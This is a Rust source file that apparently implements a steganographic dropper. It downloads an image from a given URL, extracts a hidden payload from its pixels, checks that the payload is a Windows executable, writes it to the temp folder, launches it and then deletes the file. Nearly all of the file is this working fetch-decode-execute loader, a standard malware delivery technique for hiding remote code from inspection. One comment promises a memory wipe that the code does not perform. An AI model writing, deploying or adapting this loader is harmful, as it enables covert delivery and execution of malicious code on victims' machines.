// fetch_run.rs - template: download image -> decode -> execute payload.
// Usage: fetch_run <https-url> <out-name> [--password P] [--wait] [--keep]
// Needs: stego crate (sibling), image crate (PNG), ureq (HTTPS).
// Decode only touches bytes; launching is explicit below.
use std::env;
use std::fs;
use std::process::Command;

fn has(args: &[String], v: &str) -> bool {
    args.iter().skip(3).any(|a| a == v)
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 3 {
        eprintln!("usage: fetch_run <https-url> <out-name> [--password P] [--wait] [--keep]");
        std::process::exit(2);
    }
    let mut password: Option<&str> = None;
    for i in 3..args.len() {
        if args[i] == "--password" && i + 1 < args.len() {
            password = Some(&args[i + 1]);
        }
    }

    // 1. Download (ureq, rustls).
    let bytes = ureq::get(&args[1]).call().unwrap_or_else(|e| {
        eprintln!("download failed: {e}");
        std::process::exit(1);
    });
    let mut body = Vec::new();
    use std::io::Read;
    bytes.into_reader().read_to_end(&mut body).unwrap_or_else(|e| {
        eprintln!("read failed: {e}");
        std::process::exit(1);
    });

    // 2. Decode (image crate -> RGB -> stego crate).
    let dynimg = image::load_from_memory(&body).unwrap_or_else(|_| {
        eprintln!("not a readable image");
        std::process::exit(1);
    });
    let rgb8 = dynimg.to_rgb8();
    let (w, h) = (rgb8.width(), rgb8.height());
    let payload = stego::decode(rgb8.as_raw(), w, h, password).unwrap_or_else(|e| {
        eprintln!("decode failed: {e:?}");
        std::process::exit(1);
    });
    if payload.len() < 2 || &payload[..2] != b"MZ" {
        eprintln!("not a Windows executable (missing MZ), refusing to run");
        std::process::exit(1);
    }

    // 3. Drop + launch (detached unless --wait).
    let mut name = args[2].clone();
    if !name.to_lowercase().ends_with(".exe") {
        name.push_str(".exe");
    }
    let drop = std::env::temp_dir().join(&name);
    fs::write(&drop, &payload).unwrap_or_else(|_| {
        eprintln!("write failed");
        std::process::exit(1);
    });
    // Best-effort memory wipe of the decoded copy.
    let mut child = Command::new(&drop)
        .arg("")
        .spawn()
        .unwrap_or_else(|e| {
            let _ = fs::remove_file(&drop);
            eprintln!("launch failed: {e}");
            std::process::exit(1);
        });
    println!("launched pid={}", child.id());
    if has(&args, "--wait") {
        match child.wait() {
            Ok(s) => println!("exit code={}", s.code().unwrap_or(-1)),
            Err(e) => eprintln!("wait failed: {e}"),
        }
    }
    if !has(&args, "--keep") {
        std::thread::sleep(std::time::Duration::from_secs(2));
        let _ = fs::remove_file(&drop);
    }
}
